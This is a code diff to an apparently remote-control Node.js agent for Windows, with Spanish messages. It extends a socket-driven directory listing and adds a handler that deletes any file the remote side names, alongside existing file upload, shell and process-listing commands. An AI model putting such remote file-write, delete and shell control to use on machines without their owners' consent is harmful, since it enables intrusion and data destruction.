@@ -180,30 +180,83 @@ function stopScreenStream() {
 function listDirectory(dirPath) {
   try {
     const resolved = path.resolve(currentDir, dirPath || '.');
-    if (!fs.existsSync(resolved) || !fs.statSync(resolved).isDirectory()) {
-      socket.emit('command-result', { command: 'ls', result: `❌ No encontrado: ${resolved}`, error: true });
+    if (!fs.existsSync(resolved)) {
+      socket.emit('ls-result', { 
+        error: `Directorio no encontrado: ${resolved}`, 
+        currentPath: currentDir,
+        items: []
+      });
       return;
     }
+    
+    const stat = fs.statSync(resolved);
+    if (!stat.isDirectory()) {
+      socket.emit('ls-result', { 
+        error: `No es un directorio: ${resolved}`, 
+        currentPath: currentDir,
+        items: []
+      });
+      return;
+    }
+    
     currentDir = resolved;
 
     const entries = fs.readdirSync(resolved, { withFileTypes: true });
     const items = entries.map(e => {
       let size = 0;
-      try { if (e.isFile()) size = fs.statSync(path.join(resolved, e.name)).size; } catch {}
-      return { name: e.name, isDir: e.isDirectory(), size, fullPath: path.join(resolved, e.name) };
+      let modified = '';
+      try {
+        const fullPath = path.join(resolved, e.name);
+        const stat = fs.statSync(fullPath);
+        if (e.isFile()) size = stat.size;
+        modified = stat.mtime.toLocaleString('es-ES', { 
+          year: 'numeric', 
+          month: '2-digit', 
+          day: '2-digit', 
+          hour: '2-digit', 
+          minute: '2-digit' 
+        });
+      } catch {}
+      return { 
+        name: e.name, 
+        isDir: e.isDirectory(), 
+        type: e.isDirectory() ? 'dir' : 'file',
+        size, 
+        modified,
+        fullPath: path.join(resolved, e.name) 
+      };
     });
 
-    // Add Windows drives
+    // Add Windows drives if we're at root or C:\
     let drives = [];
-    try {
-      const driveStr = execSync('wmic logicaldisk get name', { windowsHide: true }).toString();
-      drives = driveStr.split('\n').map(l => l.trim()).filter(l => /^[A-Z]:$/.test(l))
-        .map(d => ({ name: d + '\\', isDir: true, size: 0, fullPath: d + '\\' }));
-    } catch {}
+    if (resolved === 'C:\\' || resolved === '/' || resolved.match(/^[A-Z]:\\$/)) {
+      try {
+        const driveStr = execSync('wmic logicaldisk get name', { windowsHide: true }).toString();
+        drives = driveStr.split('\n')
+          .map(l => l.trim())
+          .filter(l => /^[A-Z]:$/.test(l))
+          .map(d => ({ 
+            name: d, 
+            isDir: true, 
+            type: 'dir',
+            size: 0, 
+            modified: '',
+            fullPath: d + '\\' 
+          }));
+      } catch {}
+    }
 
-    socket.emit('ls-result', { currentPath: resolved, items: [...drives, ...items] });
+    socket.emit('ls-result', { 
+      currentPath: resolved, 
+      path: resolved,
+      items: [...items] 
+    });
   } catch (err) {
-    socket.emit('command-result', { command: 'ls', result: `❌ Error: ${err.message}`, error: true });
+    socket.emit('ls-result', { 
+      error: `Error: ${err.message}`, 
+      currentPath: currentDir,
+      items: []
+    });
   }
 }
 
@@ -451,7 +504,22 @@ async function connect() {
       const dest = path.join(d.destPath ? path.resolve(currentDir, d.destPath) : currentDir, d.filename);
       fs.writeFileSync(dest, Buffer.from(d.data, 'base64'));
       socket.emit('command-result', { command: 'upload', result: `✅ Guardado: ${dest}` });
+      // Refresh directory listing
+      listDirectory(currentDir);
     } catch (e) { socket.emit('command-result', { command: 'upload', result: `❌ ${e.message}`, error: true }); }
+  });
+  socket.on('delete-file', (d) => {
+    try {
+      const fp = path.resolve(currentDir, d.filepath);
+      if (!fs.existsSync(fp)) {
+        socket.emit('command-result', { command: 'delete', result: '❌ Archivo no encontrado', error: true });
+        return;
+      }
+      fs.unlinkSync(fp);
+      socket.emit('command-result', { command: 'delete', result: `✅ Eliminado: ${path.basename(fp)}` });
+      // Refresh directory listing
+      listDirectory(currentDir);
+    } catch (e) { socket.emit('command-result', { command: 'delete', result: `❌ ${e.message}`, error: true }); }
   });
   socket.on('get-processes', async () => {
     socket.emit('processes-result', { result: await runShell('tasklist /FO TABLE') });
